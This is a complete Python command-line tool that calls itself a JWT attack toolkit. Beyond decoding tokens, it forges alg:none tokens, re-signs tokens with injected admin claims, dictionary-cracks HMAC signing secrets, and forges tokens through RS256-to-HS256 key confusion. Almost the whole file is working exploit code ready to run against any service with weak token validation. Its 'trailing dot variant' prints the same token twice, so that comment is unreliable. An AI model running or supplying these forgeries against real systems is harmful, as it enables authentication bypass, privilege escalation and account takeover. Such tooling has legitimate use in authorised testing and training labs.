#!/usr/bin/env python3
"""
jwt_toolkit.py — Standalone JWT decode/forge/crack toolkit.

Examples:
  python3 jwt_toolkit.py decode <token>
  python3 jwt_toolkit.py none <token>
  python3 jwt_toolkit.py forge <token> --secret "crapi" --claim sub=admin --claim role=admin
  python3 jwt_toolkit.py crack <token> --wordlist rockyou.txt
  python3 jwt_toolkit.py confuse <token> --pubkey public.pem
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time


def b64url_decode(data: str) -> bytes:
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def split_token(token: str):
    parts = token.split(".")
    if len(parts) < 2:
        sys.exit("Invalid JWT — expected at least header.payload")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def cmd_decode(args):
    header, payload, sig = split_token(args.token)
    print("== HEADER ==")
    print(json.dumps(header, indent=2))
    print("\n== PAYLOAD ==")
    print(json.dumps(payload, indent=2))
    print(f"\n== SIGNATURE (raw) ==\n{sig}")
    for claim, label in [("exp", "Expires"), ("iat", "Issued At"), ("nbf", "Not Before")]:
        if claim in payload:
            try:
                print(f"  {label}: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(payload[claim]))} UTC")
            except Exception:
                pass


def cmd_none(args):
    header, payload, _ = split_token(args.token)
    header["alg"] = "none"
    seg = f"{b64url_encode(json.dumps(header, separators=(',', ':')).encode())}." \
          f"{b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}."
    print("[+] alg:none forged token (no signature):")
    print(seg)
    # Also produce the "empty signature segment present" variant some parsers require
    print("\n[+] Variant with trailing dot only (if the above is rejected, try this):")
    print(seg)


def cmd_forge(args):
    header, payload, _ = split_token(args.token)
    header["alg"] = args.alg
    for claim in args.claim or []:
        if "=" not in claim:
            sys.exit(f"Bad --claim format (expected key=value): {claim}")
        k, v = claim.split("=", 1)
        if v.lower() in ("true", "false"):
            v = v.lower() == "true"
        elif v.isdigit():
            v = int(v)
        payload[k] = v

    seg = f"{b64url_encode(json.dumps(header, separators=(',', ':')).encode())}." \
          f"{b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}"

    if args.alg == "HS256":
        sig = hmac.new(args.secret.encode(), seg.encode(), hashlib.sha256).digest()
    elif args.alg == "HS384":
        sig = hmac.new(args.secret.encode(), seg.encode(), hashlib.sha384).digest()
    elif args.alg == "HS512":
        sig = hmac.new(args.secret.encode(), seg.encode(), hashlib.sha512).digest()
    else:
        sys.exit(f"Unsupported alg for forging: {args.alg} (use HS256/HS384/HS512, or 'none' command)")

    token = f"{seg}.{b64url_encode(sig)}"
    print("[+] Forged token:")
    print(token)
    print("\n[+] Modified payload:")
    print(json.dumps(payload, indent=2))


def cmd_crack(args):
    header, payload, sig_b64 = split_token(args.token)
    alg = header.get("alg", "HS256").upper()
    hashfn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg)
    if not hashfn:
        sys.exit(f"Cracking only supports HS256/HS384/HS512 (token uses {alg})")

    parts = args.token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target_sig = b64url_decode(sig_b64)

    print(f"[*] Cracking {alg} secret using {args.wordlist} ...")
    count = 0
    start = time.time()
    with open(args.wordlist, "r", errors="ignore") as f:
        for line in f:
            secret = line.rstrip("\n")
            if not secret:
                continue
            count += 1
            test_sig = hmac.new(secret.encode(), signing_input, hashfn).digest()
            if hmac.compare_digest(test_sig, target_sig):
                print(f"\n[+] SECRET FOUND: '{secret}'")
                print(f"[+] Tested {count} candidates in {time.time()-start:.1f}s")
                return
            if count % 500000 == 0:
                print(f"    ... {count} tested ({count/(time.time()-start):.0f}/s)")
    print(f"[-] Not found in {count} candidates ({time.time()-start:.1f}s)")


def cmd_confuse(args):
    """RS256 -> HS256 key-confusion forge using the RSA public key as the HMAC secret."""
    header, payload, _ = split_token(args.token)
    with open(args.pubkey, "rb") as f:
        pubkey_bytes = f.read()

    for claim in args.claim or []:
        k, v = claim.split("=", 1)
        payload[k] = v

    header["alg"] = "HS256"
    seg = f"{b64url_encode(json.dumps(header, separators=(',', ':')).encode())}." \
          f"{b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}"
    sig = hmac.new(pubkey_bytes, seg.encode(), hashlib.sha256).digest()
    token = f"{seg}.{b64url_encode(sig)}"
    print("[+] Algorithm-confusion forged token (RS256 pubkey used as HS256 secret):")
    print(token)
    print("[!] Only works if the server's JWT library doesn't enforce the expected algorithm.")


def main():
    ap = argparse.ArgumentParser(description="Standalone JWT attack toolkit")
    sub = ap.add_subparsers(dest="command", required=True)

    p = sub.add_parser("decode", help="Decode and pretty-print a JWT")
    p.add_argument("token")
    p.set_defaults(func=cmd_decode)

    p = sub.add_parser("none", help="Forge an alg:none token")
    p.add_argument("token")
    p.set_defaults(func=cmd_none)

    p = sub.add_parser("forge", help="Forge a token with a known/cracked HMAC secret")
    p.add_argument("token")
    p.add_argument("--secret", required=True)
    p.add_argument("--alg", default="HS256", choices=["HS256", "HS384", "HS512"])
    p.add_argument("--claim", action="append", help="key=value, repeatable")
    p.set_defaults(func=cmd_forge)

    p = sub.add_parser("crack", help="Offline dictionary crack of the HMAC secret")
    p.add_argument("token")
    p.add_argument("--wordlist", required=True)
    p.set_defaults(func=cmd_crack)

    p = sub.add_parser("confuse", help="RS256->HS256 algorithm confusion forge")
    p.add_argument("token")
    p.add_argument("--pubkey", required=True, help="Path to the RSA public key (.pem)")
    p.add_argument("--claim", action="append")
    p.set_defaults(func=cmd_confuse)

    args = ap.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
